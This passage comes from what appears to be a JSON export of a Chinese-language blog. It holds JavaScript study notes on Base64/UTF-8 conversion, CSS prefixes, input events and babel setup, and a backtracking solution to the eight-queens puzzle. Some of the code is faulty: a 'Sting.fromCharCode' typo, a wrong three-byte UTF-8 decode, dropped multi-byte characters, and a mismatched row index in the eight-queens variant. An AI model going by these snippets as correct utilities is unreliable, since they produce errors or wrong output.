'9', '+', '/'\n        ],\n        UTF16ToUTF8 : function(str) {\n            var res = [], len = str.length;\n            for (var i = 0; i &lt; len; i++) {\n                var code = str.charCodeAt(i);\n                if (code &gt; 0x0000 &amp;&amp; code &lt;= 0x007F) {\n                    // 单字节，这里并不考虑0x0000，因为它是空字节\n                    // U+00000000 – U+0000007F  0xxxxxxx\n                    res.push(str.charAt(i));\n                } else if (code &gt;= 0x0080 &amp;&amp; code &lt;= 0x07FF) {\n                    // 双字节\n                    // U+00000080 – U+000007FF  110xxxxx 10xxxxxx\n                    // 110xxxxx\n                    var byte1 = 0xC0 | ((code &gt;&gt; 6) &amp; 0x1F);\n                    // 10xxxxxx\n                    var byte2 = 0x80 | (code &amp; 0x3F);\n                    res.push(\n                        String.fromCharCode(byte1), \n                        String.fromCharCode(byte2)\n                    );\n                } else if (code &gt;= 0x0800 &amp;&amp; code &lt;= 0xFFFF) {\n                    // 三字节\n                    // U+00000800 – U+0000FFFF  1110xxxx 10xxxxxx 10xxxxxx\n                    // 1110xxxx\n                    var byte1 = 0xE0 | ((code &gt;&gt; 12) &amp; 0x0F);\n                    // 10xxxxxx\n                    var byte2 = 0x80 | ((code &gt;&gt; 6) &amp; 0x3F);\n                    // 10xxxxxx\n                    var byte3 = 0x80 | (code &amp; 0x3F);\n                    res.push(\n                        String.fromCharCode(byte1), \n                        String.fromCharCode(byte2), \n                        String.fromCharCode(byte3)\n                    );\n                } else if (code &gt;= 0x00010000 &amp;&amp; code &lt;= 0x001FFFFF) {\n                    // 四字节\n                    // U+00010000 – U+001FFFFF  11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\n                } else if (code &gt;= 0x00200000 &amp;&amp; code &lt;= 0x03FFFFFF) {\n                    // 五字节\n                    // U+00200000 – U+03FFFFFF  111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n                } else /** if (code &gt;= 0x04000000 &amp;&amp; code &lt;= 0x7FFFFFFF)*/ {\n                    // 六字节\n                    // U+04000000 – U+7FFFFFFF  1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n                }\n            }\n\n            return res.join('');\n        },\n        UTF8ToUTF16 : function(str) {\n            var res = [], len = str.length;\n            var i = 0;\n            for (var i = 0; i &lt; len; i++) {\n                var code = str.charCodeAt(i);\n                // 对第一个字节进行判断\n                if (((code &gt;&gt; 7) &amp; 0xFF) == 0x0) {\n                    // 单字节\n                    // 0xxxxxxx\n                    res.push(str.charAt(i));\n                } else if (((code &gt;&gt; 5) &amp; 0xFF) == 0x6) {\n                    // 双字节\n                    // 110xxxxx 10xxxxxx\n                    var code2 = str.charCodeAt(++i);\n                    var byte1 = (code &amp; 0x1F) &lt;&lt; 6;\n                    var byte2 = code2 &amp; 0x3F;\n                    var utf16 = byte1 | byte2;\n                    res.push(Sting.fromCharCode(utf16));\n                } else if (((code &gt;&gt; 4) &amp; 0xFF) == 0xE) {\n                    // 三字节\n                    // 1110xxxx 10xxxxxx 10xxxxxx\n                    var code2 = str.charCodeAt(++i);\n                    var code3 = str.charCodeAt(++i);\n                    var byte1 = (code &lt;&lt; 4) | ((code2 &gt;&gt; 2) &amp; 0x0F);\n                    var byte2 = ((code2 &amp; 0x03) &lt;&lt; 6) | (code3 &amp; 0x3F);\n                    var utf16 = ((byte1 &amp; 0x00FF) &lt;&lt; 8) | byte2\n                    res.push(String.fromCharCode(utf16));\n                } else if (((code &gt;&gt; 3) &amp; 0xFF) == 0x1E) {\n                    // 四字节\n                    // 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\n                } else if (((code &gt;&gt; 2) &amp; 0xFF) == 0x3E) {\n                    // 五字节\n                    // 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n                } else /** if (((code &gt;&gt; 1) &amp; 0xFF) == 0x7E)*/ {\n                    // 六字节\n                    // 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n                }\n            }\n\n            return res.join('');\n        },\n        encode : function(str) {\n            if (!str) {\n                return '';\n            }\n            var utf8    = this.UTF16ToUTF8(str); // 转成UTF8\n            var i = 0; // 遍历索引\n            var len = utf8.length;\n            var res = [];\n            while (i &lt; len) {\n                var c1 = utf8.charCodeAt(i++) &amp; 0xFF;\n                res.push(this.table[c1 &gt;&gt; 2]);\n                // 需要补2个=\n                if (i == len) {\n                    res.push(this.table[(c1 &amp; 0x3) &lt;&lt; 4]);\n                    res.push('==');\n                    break;\n                }\n                var c2 = utf8.charCodeAt(i++);\n                // 需要补1个=\n                if (i == len) {\n                    res.push(this.table[((c1 &amp; 0x3) &lt;&lt; 4) | ((c2 &gt;&gt; 4) &amp; 0x0F)]);\n                    res.push(this.table[(c2 &amp; 0x0F) &lt;&lt; 2]);\n                    res.push('=');\n                    break;\n                }\n                var c3 = utf8.charCodeAt(i++);\n                res.push(this.table[((c1 &amp; 0x3) &lt;&lt; 4) | ((c2 &gt;&gt; 4) &amp; 0x0F)]);\n                res.push(this.table[((c2 &amp; 0x0F) &lt;&lt; 2) | ((c3 &amp; 0xC0) &gt;&gt; 6)]);\n                res.push(this.table[c3 &amp; 0x3F]);\n            }\n\n            return res.join('');\n        },\n        decode : function(str) {\n            if (!str) {\n                return '';\n            }\n\n            var len = str.length;\n            var i   = 0;\n            var res = [];\n\n            while (i &lt; len) {\n                code1 = this.table.indexOf(str.charAt(i++));\n                code2 = this.table.indexOf(str.charAt(i++));\n                code3 = this.table.indexOf(str.charAt(i++));\n                code4 = this.table.indexOf(str.charAt(i++));\n\n                c1 = (code1 &lt;&lt; 2) | (code2 &gt;&gt; 4);\n                c2 = ((code2 &amp; 0xF) &lt;&lt; 4) | (code3 &gt;&gt; 2);\n                c3 = ((code3 &amp; 0x3) &lt;&lt; 6) | code4;\n\n                res.push(String.fromCharCode(c1));\n\n                if (code3 != 64) {\n                    res.push(String.fromCharCode(c2));\n                }\n                if (code4 != 64) {\n                    res.push(String.fromCharCode(c3));\n                }\n\n            }\n\n            return this.UTF8ToUTF16(res.join(''));\n        }\n    };\n        var css3 = function(dom) {\n            this.dom = dom;\n            this.css = function(option) {\n                if (arguments.length === 2) {\n                    var obj = {};\n                    obj[arguments[0]] = arguments[1];\n                    option = obj;\n                }\n                for (var key in option) {\n                    var temp = document.createElement('temp').style;\n                    if (typeof temp[key] === &quot;undefined&quot;) {\n                        var prefixes = ['Webkit', 'Moz', 'O', 'ms', 'Khtml'];\n                        var keyC = key.charAt(0).toUpperCase() + key.substr(1);\n                        for (var x in prefixes) {\n                            prefixes[x] = prefixes[x] + keyC;\n                            if (typeof temp[prefixes[x]] !== &quot;undefined&quot;) {\n                                this.dom.style[prefixes[x]] = option[key];\n                                return this;\n                            }\n                        }\n                    } else {\n                        this.dom.style[key] = option[key];\n                        return this;\n                    }\n                }\n            }\n            if (this === window) {\n                return new css3(dom);\n            }\n        }\n</code></pre>\n<pre><code>getOwnPropertyNames 方法同时返回可枚举的和不可枚举的属性和方法的名称。若要仅返回可枚举的属性和方法的名称，可使用 Object.keys 函数 (JavaScript)。  \n</code></pre>\n<pre><code>恩 。 babel升级拆分了模块 。你需要 \nnpm install babel-loader babel-core babel-preset-es2015 babel-preset-react —save-dev  \n然后 \nloader: &quot;babel?presets[]=react,presets[]=es2015&quot;\n\n就好了\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"4","plaintext":"var Reg=new RegExp(/data-page=\"\\d+\"/g)\nvar arr=str.match(Reg)\n\n\n在 Web 开发中经常会碰到需要动态监听输入框值变化的情况，如果使用 onkeydown、onkeypress、onkeyup 这个几个键盘事件来监测的话，监听不了右键的复制、剪贴和粘贴这些操作，处理组合快捷键也很麻烦。因此这篇文章向大家介绍一种完美的解决方案：结合 HTML5 标准事件 oninput 和 IE 专属事件 onpropertychange 事件来监听输入框值变化。\n\n\npattern接正则表达式。\n```\nvar pp = {\n_name : \"jeapedu\",\nset name(v){\nthis._name = v;\n},\nget name(){\nreturn this._name;\n}\n}\npp.name = \"China\";\nconsole.log(pp.name);\n```var comment = document.getElementsByTagName('a')[0];\n \nif (document.all) {\n // For IE \ncomment.click();\n} \nelse if (document.createEvent) {\n   //FOR DOM2\nvar ev = document.createEvent('MouseEvents');\n ev.initEvent('click', false, true);\n comment.dispatchEvent(ev);\n}\n\n\n高度塌陷的问题 – 清除浮动 \n1.直接一个<div style=\"clear:both;\"></div>放到当作最后一个子标签放到父标签  \n2.overflow + zoom方法    .fix{overflow:hidden; zoom:1;}  \n3. after + zoom方法  \n.fix{zoom:1;}\n.fix:after{display:block; content:'clear'; clear:both; line-height:0; visibility:hidden;} \n\n\n       Array.prototype.indexOf = function(val) {\n            for (var i = 0; i < this.length; i++) {\n                if (this[i] == val) return i;\n            }\n            return -1;\n        };\n        Array.prototype.remove = function(val) {\n            var index = this.indexOf(val);\n            if (index > -1) {\n                this.splice(index, 1);\n            }\n        };\n\n\nreq.headers 看请求头  \nreq.on(‘data’) 请求事件  \nres.writeHeader() 写响应头  \nres.write() 写响应体  \n前端ajax的接口就是：XMLHTTPRequest的实例ajax\n\najax.status 看响应码  \najax.responseText 看响应体  \najax.onload 响应事件  \najax.open() 请求方法  \najax.setRequestHeader() 请求头  \najax.send() 请求体  \n\n\nparseInt('123',10)  慢  \nNumber('123')  \n'123'<<0            快  \n注： 小心使用位操作运算符。数字会被当成 64 位值，但是位操作运算符总是返回 32 位的整数（source）。位操作处理大于 32 位的整数值时还会导致意料之外的行为。讨论。最大的 32 位整数是 2,147,483,647：\n2147483647 >> 0 //=> 2147483647  \n2147483648 >> 0 //=> -2147483648  \n2147483649 >> 0 //=> -2147483647\n\n~~n  都行\nn<<0  \nn>>0  \nn|0  \n\n\n var Base64 = {\n        // 转码表\n        table : [\n                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n                'I', 'J', 'K', 'L', 'M', 'N', 'O' ,'P',\n                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n                'w', 'x', 'y', 'z', '0', '1', '2', '3',\n                '4', '5', '6', '7', '8', '9', '+', '/'\n        ],\n        UTF16ToUTF8 : function(str) {\n            var res = [], len = str.length;\n            for (var i = 0; i < len; i++) {\n                var code = str.charCodeAt(i);\n                if (code > 0x0000 && code <= 0x007F) {\n                    // 单字节，这里并不考虑0x0000，因为它是空字节\n                    // U+00000000 – U+0000007F  0xxxxxxx\n                    res.push(str.charAt(i));\n                } else if (code >= 0x0080 && code <= 0x07FF) {\n                    // 双字节\n                    // U+00000080 – U+000007FF  110xxxxx 10xxxxxx\n                    // 110xxxxx\n                    var byte1 = 0xC0 | ((code >> 6) & 0x1F);\n                    // 10xxxxxx\n                    var byte2 = 0x80 | (code & 0x3F);\n                    res.push(\n                        String.fromCharCode(byte1), \n                        String.fromCharCode(byte2)\n                    );\n                } else if (code >= 0x0800 && code <= 0xFFFF) {\n                    // 三字节\n                    // U+00000800 – U+0000FFFF  1110xxxx 10xxxxxx 10xxxxxx\n                    // 1110xxxx\n                    var byte1 = 0xE0 | ((code >> 12) & 0x0F);\n                    // 10xxxxxx\n                    var byte2 = 0x80 | ((code >> 6) & 0x3F);\n                    // 10xxxxxx\n                    var byte3 = 0x80 | (code & 0x3F);\n                    res.push(\n                        String.fromCharCode(byte1), \n                        String.fromCharCode(byte2), \n                        String.fromCharCode(byte3)\n                    );\n                } else if (code >= 0x00010000 && code <= 0x001FFFFF) {\n                    // 四字节\n                    // U+00010000 – U+001FFFFF  11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\n                } else if (code >= 0x00200000 && code <= 0x03FFFFFF) {\n                    // 五字节\n                    // U+00200000 – U+03FFFFFF  111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n                } else /** if (code >= 0x04000000 && code <= 0x7FFFFFFF)*/ {\n                    // 六字节\n                    // U+04000000 – U+7FFFFFFF  1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n                }\n            }\n\n            return res.join('');\n        },\n        UTF8ToUTF16 : function(str) {\n            var res = [], len = str.length;\n            var i = 0;\n            for (var i = 0; i < len; i++) {\n                var code = str.charCodeAt(i);\n                // 对第一个字节进行判断\n                if (((code >> 7) & 0xFF) == 0x0) {\n                    // 单字节\n                    // 0xxxxxxx\n                    res.push(str.charAt(i));\n                } else if (((code >> 5) & 0xFF) == 0x6) {\n                    // 双字节\n                    // 110xxxxx 10xxxxxx\n                    var code2 = str.charCodeAt(++i);\n                    var byte1 = (code & 0x1F) << 6;\n                    var byte2 = code2 & 0x3F;\n                    var utf16 = byte1 | byte2;\n                    res.push(Sting.fromCharCode(utf16));\n                } else if (((code >> 4) & 0xFF) == 0xE) {\n                    // 三字节\n                    // 1110xxxx 10xxxxxx 10xxxxxx\n                    var code2 = str.charCodeAt(++i);\n                    var code3 = str.charCodeAt(++i);\n                    var byte1 = (code << 4) | ((code2 >> 2) & 0x0F);\n                    var byte2 = ((code2 & 0x03) << 6) | (code3 & 0x3F);\n                    var utf16 = ((byte1 & 0x00FF) << 8) | byte2\n                    res.push(String.fromCharCode(utf16));\n                } else if (((code >> 3) & 0xFF) == 0x1E) {\n                    // 四字节\n                    // 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\n                } else if (((code >> 2) & 0xFF) == 0x3E) {\n                    // 五字节\n                    // 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n                } else /** if (((code >> 1) & 0xFF) == 0x7E)*/ {\n                    // 六字节\n                    // 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n                }\n            }\n\n            return res.join('');\n        },\n        encode : function(str) {\n            if (!str) {\n                return '';\n            }\n            var utf8    = this.UTF16ToUTF8(str); // 转成UTF8\n            var i = 0; // 遍历索引\n            var len = utf8.length;\n            var res = [];\n            while (i < len) {\n                var c1 = utf8.charCodeAt(i++) & 0xFF;\n                res.push(this.table[c1 >> 2]);\n                // 需要补2个=\n                if (i == len) {\n                    res.push(this.table[(c1 & 0x3) << 4]);\n                    res.push('==');\n                    break;\n                }\n                var c2 = utf8.charCodeAt(i++);\n                // 需要补1个=\n                if (i == len) {\n                    res.push(this.table[((c1 & 0x3) << 4) | ((c2 >> 4) & 0x0F)]);\n                    res.push(this.table[(c2 & 0x0F) << 2]);\n                    res.push('=');\n                    break;\n                }\n                var c3 = utf8.charCodeAt(i++);\n                res.push(this.table[((c1 & 0x3) << 4) | ((c2 >> 4) & 0x0F)]);\n                res.push(this.table[((c2 & 0x0F) << 2) | ((c3 & 0xC0) >> 6)]);\n                res.push(this.table[c3 & 0x3F]);\n            }\n\n            return res.join('');\n        },\n        decode : function(str) {\n            if (!str) {\n                return '';\n            }\n\n            var len = str.length;\n            var i   = 0;\n            var res = [];\n\n            while (i < len) {\n                code1 = this.table.indexOf(str.charAt(i++));\n                code2 = this.table.indexOf(str.charAt(i++));\n                code3 = this.table.indexOf(str.charAt(i++));\n                code4 = this.table.indexOf(str.charAt(i++));\n\n                c1 = (code1 << 2) | (code2 >> 4);\n                c2 = ((code2 & 0xF) << 4) | (code3 >> 2);\n                c3 = ((code3 & 0x3) << 6) | code4;\n\n                res.push(String.fromCharCode(c1));\n\n                if (code3 != 64) {\n                    res.push(String.fromCharCode(c2));\n                }\n                if (code4 != 64) {\n                    res.push(String.fromCharCode(c3));\n                }\n\n            }\n\n            return this.UTF8ToUTF16(res.join(''));\n        }\n    };\n        var css3 = function(dom) {\n            this.dom = dom;\n            this.css = function(option) {\n                if (arguments.length === 2) {\n                    var obj = {};\n                    obj[arguments[0]] = arguments[1];\n                    option = obj;\n                }\n                for (var key in option) {\n                    var temp = document.createElement('temp').style;\n                    if (typeof temp[key] === \"undefined\") {\n                        var prefixes = ['Webkit', 'Moz', 'O', 'ms', 'Khtml'];\n                        var keyC = key.charAt(0).toUpperCase() + key.substr(1);\n                        for (var x in prefixes) {\n                            prefixes[x] = prefixes[x] + keyC;\n                            if (typeof temp[prefixes[x]] !== \"undefined\") {\n                                this.dom.style[prefixes[x]] = option[key];\n                                return this;\n                            }\n                        }\n                    } else {\n                        this.dom.style[key] = option[key];\n                        return this;\n                    }\n                }\n            }\n            if (this === window) {\n                return new css3(dom);\n            }\n        }\n\n\ngetOwnPropertyNames 方法同时返回可枚举的和不可枚举的属性和方法的名称。若要仅返回可枚举的属性和方法的名称，可使用 Object.keys 函数 (JavaScript)。  \n\n\n恩 。 babel升级拆分了模块 。你需要 \nnpm install babel-loader babel-core babel-preset-es2015 babel-preset-react —save-dev  \n然后 \nloader: \"babel?presets[]=react,presets[]=es2015\"\n\n就好了","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-01-22T06:39:06.000Z","created_by":"1","updated_at":"2017-01-17T07:23:22.000Z","updated_by":"1","published_at":"2016-01-22T06:47:50.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2c5","uuid":"7a4a2044-589f-4a42-9b05-2afff6a15532","title":"八皇后（javascript）","slug":"ba-huang-hou-wen-ti-javascript","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"八皇后是一道很具典型性的题目。它的基本要求是这样的：在一个8*8的矩阵上面放置8个物体，一个矩阵点只允许放置一个物体，任意两个点不能在一行上，也不能在一列上，不能在一条左斜线上，当然也不能在一条右斜线上。\\n\\n准备模型,打印方法，检测方法。\\n```\\n          var cloneObj = function(obj){    //深拷贝\\n            var str, newobj = obj.constructor === Array ? [] : {};\\n            if(typeof obj !== 'object'){\\n                return;\\n            } else if(window.JSON){\\n                str = JSON.stringify(obj), //系列化对象\\n                        newobj = JSON.parse(str); //还原\\n            } else {\\n                for(var i in obj){\\n                    newobj[i] = typeof obj[i] === 'object' ?\\n                            cloneObj(obj[i]) : obj[i];\\n                }\\n            }\\n            return newobj;\\n        };\\n        var QSS=[];   //棋盘解的集合\\n        Array.prototype.indexOf = function(val) {   //数组处理\\n            for (var i = 0; i < this.length; i++) {\\n                if (this[i] == val) return i;\\n            }\\n            return -1;\\n        };\\n        var nQueens = [   //棋盘\\n            [0,0,0,0,0,0,0,0],\\n            [0,0,0,0,0,0,0,0],\\n            [0,0,0,0,0,0,0,0],\\n            [0,0,0,0,0,0,0,0],\\n            [0,0,0,0,0,0,0,0],\\n            [0,0,0,0,0,0,0,0],\\n            [0,0,0,0,0,0,0,0],\\n            [0,0,0,0,0,0,0,0]\\n        ];\\n        function printQ(queens) {  //打印棋盘\\n            for (var row=0; row<queens.length; row++) {\\n                var rowText = '';\\n                for (var col=0; col<queens.length; col++) {\\n                    if (queens[row][col]===undefined||queens[row][col]==null) {\\n                        queens[row][col] = 0;\\n                    }\\n                    rowText = rowText + queens[row][col] + '  ';\\n                }\\n                console.log(rowText);\\n            }\\n        }\\n        function isTrue(nQueens,row,col){   //检测该位置是否满足\\n            for(var i=1;i<row+1;i++){\\n                if(nQueens[row-i][col]==1|| nQueens[row-i][col+i]|| nQueens[row-i][col-i]){return false}\\n            }\\n            return true;\\n        }\\n```\\n回溯法。一行只能有一个棋子。从第一行第一个格子放起。放了以后。再从第二排开始第一个格子检测，如果为true，则放下。然后，下一行第一个格子检测。如果其中有一排都为false且不是最后一排。则退后一行（row=row-2）。继续上一行检测.如果上一行的最后一个为1，退后2排（row=row-3）。\\n```\\n\\n    function NQueens(order){\\n            var tempCol=0;\\n            rowLoop:\\n            for(var row=0;row<order;row++){\\n                for(var col=tempCol;col<order;col++){\\n                    tempCol=0;\\n                    if(isTrue(nQueens,row,col)){\\n                        nQueens[row][col]=1;\\n                        if(row==7){\\n                            QSS.push(cloneObj(nQueens));\\n                            var mIndex=nQueens[row].indexOf(1);\\n                            nQueens[row][mIndex]=0;\\n                            if(col==7){\\n                                var mIndex=nQueens[row-1].indexOf(1);\\n                                nQueens[row-1][mIndex]=0;\\n                                row= row-2;\\n                                tempCol=mIndex+1;\\n                                continue rowLoop;\\n                            }\\n                            continue;\\n                        }\\n                        continue rowLoop;\\n\\n                    }else{//next\\n                        if(col==7){\\n                            var mIndex=nQueens[row-1].indexOf(1);\\n                            nQueens[row-1][mIndex]=0;\\n                            if(mIndex==7){\\n                                if(row==1){   alert('????????????'); break rowLoop;}\\n                                mIndex=nQueens[row-2].indexOf(1);\\n                                nQueens[row-2][mIndex]=0;\\n                                row = row-3;\\n                                tempCol=mIndex+1;\\n                            }\\n                            else{\\n                                row= row-2;\\n                                tempCol=mIndex+1;\\n                            }\\n                            continue rowLoop;\\n                        }\\n                    }\\n                }\\n            }\\n        }\\n\\n        NQueens(8);\\n\\n        console.log(QSS.length)\\n        for(var x in QSS){\\n            console.log('///////////////////////')\\n            printQ(QSS[x])\\n        }\\n```\\n结果如下 \\n![](/content/images/2016/01/IF-HW--G4-2--U-----S615.png)\\n一共92个解。\\n\\n该题可以利用左右对称。只需求出46个解。就可以得出92个解。在这里两种情况都要考虑到。 如果其中有一排都为false且不是最后一排。则退后一行（row=row-2）。继续上一行检测.如果上一行的最后一个为1，退后2排（row=row-3）。\\n![](/content/images/2016/02/QDJ0YM7-K0-T-YUK-G-OFKA.png)\\n```\\n        function NQueens(order){\\n            var tempCol=0;\\n            rowLoop:\\n            for(var row=0;row<order;row++){\\n                for(var col=tempCol;col<order;col++){\\n                    tempCol=0;\\n                    if(isTrue(nQueens,row,col)){\\n                        nQueens[row][col]=1;\\n                        if(row==7){\\n                            QSS.push(cloneObj(nQueens));\\n                            var mIndex=nQueens[row].indexOf(1);\\n                            nQueens[row][mIndex]=0;\\n                            if(col==7){\\n                                var mIndex=nQueens[row-1].indexOf(1);\\n                                nQueens[row-2][mIndex]=0;\\n                                row= row-2;\\n                                tempCol=mIndex+1;\\n                                continue rowLoop;\\n                            }\\n                            continue;\\n                        }\\n                        continue rowLoop;\\n\\n                    }else{//next\\n                        if(col==7){\\n                            var mIndex=nQueens[row-1].indexOf(1);\\n                            nQueens[row-1][mIndex]=0;\\n                            if(mIndex==3&&row==1){\\n                                alert('完成一半');  //在此跳出循环\\n                            }\\n                            if(mIndex==7){\\n                                if(row==1){   alert('回溯完成'); break rowLoop;}\\n                                mIndex=nQueens[row-2].indexOf(1);\\n                                nQueens[row-2][mIndex]=0;\\n                                if(mIndex==3&&row==2){\\n                                    console.log(QSS.length)\\n                                    alert('完成一半');   //在此跳出循环(真)\\n                                }\\n                                row = row-3;\\n                                tempCol=mIndex+1;\\n                            }\\n                            else{\\n                                row= row-2;\\n                                tempCol=mIndex+1;\\n                            }\\n                            continue rowLoop;\\n                        }\\n                    }\\n                }\\n            }\\n        }\\n\\n        NQueens(8);\\n\\n        console.log(QSS.length)\\n        for(var x in QSS){\\n            console.log('/////////////')\\n            printQ(QSS[x])\\n        }\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>八皇后是一道很具典型性的题目。它的基本要求是这样的：在一个8*8的矩阵上面放置8个物体，一个矩阵点只允许放置一个物体，任意两个点不能在一行上，也不能在一列上，不能在一条左斜线上，当然也不能在一条右斜线上。</p>\n<p>准备模型,打印方法，检测方法。</p>\n<pre><code>          var cloneObj = function(obj){    //深拷贝\n            var str, newobj = obj.constructor === Array ? [] : {};\n            if(typeof obj !== 'object'){\n                return;\n            } else if(window.JSON){\n                str = JSON.stringify(obj), //系列化对象\n                        newobj = JSON.parse(str); //还原\n            } else {\n                for(var i in obj){\n                    newobj[i] = typeof obj[i] === 'object' ?\n                            cloneObj(obj[i]) : obj[i];\n                }\n            }\n            return newobj;\n        };\n        var QSS=[];   //棋盘解的集合\n        Array.prototype.indexOf = function(val) {   //数组处理\n            for (var i = 0; i &lt; this.length; i++) {\n                if (this[i] == val) return i;\n            }\n            return -1;\n        };\n        var nQueens = [   //棋盘\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0],\n            [0,0,0,0,0,0,0,0]\n        ];\n        function printQ(queens) {  //打印棋盘\n            for (var row=0; row&lt;queens.length; row++) {\n                var rowText = '';\n                for (var col=0; col&lt;queens.length; col++) {\n                    if (queens[row][col]===undefined||queens[row][col]==null) {\n                        queens[row][col] = 0;\n                    }\n                    rowText = rowText + queens[row][col] + '  ';\n                }\n                console.log(rowText);\n            }\n        }\n        function isTrue(nQueens,row,col){   //检测该位置是否满足\n            for(var i=1;i&lt;row+1;i++){\n                if(nQueens[row-i][col]==1|| nQueens[row-i][col+i]|| nQueens[row-i][col-i]){return false}\n            }\n            return true;\n        }\n</code></pre>\n<p>回溯法。一行只能有一个棋子。从第一行第一个格子放起。放了以后。再从第二排开始第一个格子检测，如果为true，则放下。然后，下一行第一个格子检测。如果其中有一排都为false且不是最后一排。则退后一行（row=row-2）。继续上一行检测.如果上一行的最后一个为1，退后2排（row=row-3）。</p>\n<pre><code>\n    function NQueens(order){\n            var tempCol=0;\n            rowLoop:\n            for(var row=0;row&lt;order;row++){\n                for(var col=tempCol;col&lt;order;col++){\n                    tempCol=0;\n                    if(isTrue(nQueens,row,col)){\n                        nQueens[row][col]=1;\n                        if(row==7){\n                            QSS.push(cloneObj(nQueens));\n                            var mIndex=nQueens[row].indexOf(1);\n                            nQueens[row][mIndex]=0;\n                            if(col==7){\n                                var mIndex=nQueens[row-1].indexOf(1);\n                                nQueens[row-1][mIndex]=0;\n                                row= row-2;\n                                tempCol=mIndex+1;\n                                continue rowLoop;\n                            }\n                            continue;\n                        }\n                        continue rowLoop;\n\n                    }else{//next\n                        if(col==7){\n                            var mIndex=nQueens[row-1].indexOf(1);\n                            nQueens[row-1][mIndex]=0;\n                            if(mIndex==7){\n                                if(row==1){   alert('????????????'); break rowLoop;}\n                                mIndex=nQueens[row-2].indexOf(1);\n                                nQueens[row-2][mIndex]=0;\n                                row = row-3;\n                                tempCol=mIndex+1;\n                            }\n                            else{\n                                row= row-2;\n                                tempCol=mIndex+1;\n                            }\n                            continue rowLoop;\n                        }\n                    }\n                }\n            }\n        }\n\n        NQueens(8);\n\n        console.log(QSS.length)\n        for(var x in QSS){\n            console.log('///////////////////////')\n            printQ(QSS[x])\n        }\n</code></pre>\n<p>结果如下<br>\n<img src=\"/content/images/2016/01/IF-HW--G4-2--U-----S615.png\" alt=\"\"><br>\n一共92个解。</p>\n<p>该题可以利用左右对称。只需求出46个解。就可以得出92个解。在这里两种情况都要考虑到。 如果其中有一排都为false且不是最后一排。则退后一行（row=row-2）。继续上一行检测.如果上一行的最后一个为1，退后2排（row=row-3）。<br>\n<img src=\"/content/images/2016/02/QDJ0YM7-K0-T-YUK-G-OFKA.png\" alt=\"\"></p>\n<pre><code>        function NQueens(order){\n            var tempCol=0;\n            rowLoop:\n            for(var row=0;row&lt;order;row++){\n                for(var col=tempCol;col&lt;order;col++){\n                    tempCol=0;\n                    if(isTrue(nQueens,row,col)){\n                        nQueens[row][col]=1;\n                        if(row==7){\n                            QSS.push(cloneObj(nQueens));\n                            var mIndex=nQueens[row].indexOf(1);\n                            nQueens[row][mIndex]=0;\n                            if(col==7){\n                                var mIndex=nQueens[row-1].indexOf(1);\n                                nQueens[row-2][mIndex]=0;\n                                row= row-2;\n                                tempCol=mIndex+1;\n                                continue rowLoop;\n                            }\n                            continue;\n                        }\n                        continue rowLoop;\n\n                    }else{//next\n                        if(col==7){\n                            var mIndex=nQueens[row-1].indexOf(1);\n                            nQueens[row-1][mIndex]=0;\n                            if(mIndex==3&amp;&amp;row==1){\n                                alert('完成一半');  //在此跳出循环\n                            }\n                            if(mIndex==7){\n                                if(row==1){   alert('回溯完成'); break rowLoop;}\n                                mIndex=nQueens[row-2].indexOf(1);\n                                nQueens[row-2][mIndex]=0;\n                                if(mIndex==3&amp;&amp;row==2){\n                                    console.log(QSS.length)\n                                    alert('完成一半');   //在此跳出循环(真)\n                                }\n                                row = row-3;\n                                tempCol=mIndex+1;\n                            }\n                            else{\n                                row= row-2;\n                                tempCol=mIndex+1;\n                            }\n                            continue rowLoop;\n                        }\n                    }\n                }\n            }\n        }\n\n        NQueens(8);\n\n        console.log(QSS.length)\n        for(var x in QSS){\n            console.log('/////////////')\n            printQ(QSS[x])\n        }\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"5","plaintext":"八皇后是一道很具典型性的题目。它的基本要求是这样的：在一个8*8的矩阵上面放置8个物体，一个矩阵点只允许放置一个物体，任意两个点不能在一行上，也不能在一列上，不能在一条左斜线上，当然也不能在一条右斜线上。\n\n准备模型,打印方法，检测方法。\n\n          var cloneObj = function(obj){    //深拷贝\n            var str, newobj = obj.constructor === Array ? [] : {};\n            if(typeof obj !== 'object'){\n                return;\n            } else if(window.JSON){\n                str = JSON.stringify(obj), //系列化对象\n                        newobj = JSON.parse(str); //还原\n            } else {\n                for(var i in obj){\n                    newobj[i] = typeof obj[i] === 'object' ?\n                            cloneObj(obj[i]) : obj[i];\n                }\n            }\n            return newobj;\n        };\n        var QSS=[];   //棋盘解的集合\n        Array.prototype.indexOf = function(val) {   //数组处理\n            for (var i = 0; i < this.length; i++) {\n                if (this[i] == val) return i;\n            }\n            return -1;\n        };\n        var nQueens = [   //棋盘\n            [0,0,0,0,0,0,0,0],\n            